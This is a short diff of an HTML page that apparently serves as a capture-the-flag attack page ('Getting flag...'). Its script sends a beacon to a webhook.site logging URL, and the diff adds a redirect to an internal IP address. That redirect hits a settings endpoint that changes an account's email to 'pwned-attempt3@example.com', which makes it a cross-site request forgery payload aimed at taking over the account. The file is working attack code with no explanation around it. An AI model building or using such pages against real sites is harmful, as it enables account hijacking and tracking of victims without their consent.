@@ -7,11 +7,8 @@
 <body>
 <p>Getting flag...</p>
 <script>
-  // Log the beacon (subresource — confirms JS runs; cookie NOT expected here, that's fine)
   new Image().src = "https://webhook.site/348d6e64-c06d-4202-826f-7ee825b6f32a?stage=loaded";
-
-  // Top-level navigation — goes through webhook.site (logged), then 302s to the real target
-  location.href = "https://webhook.site/348d6e64-c06d-4202-826f-7ee825b6f32a?stage=nav";
+  location.href = "http://100.101.228.35:6009/settings/email?new=pwned-attempt3@example.com";
 </script>
 </body>
 </html>
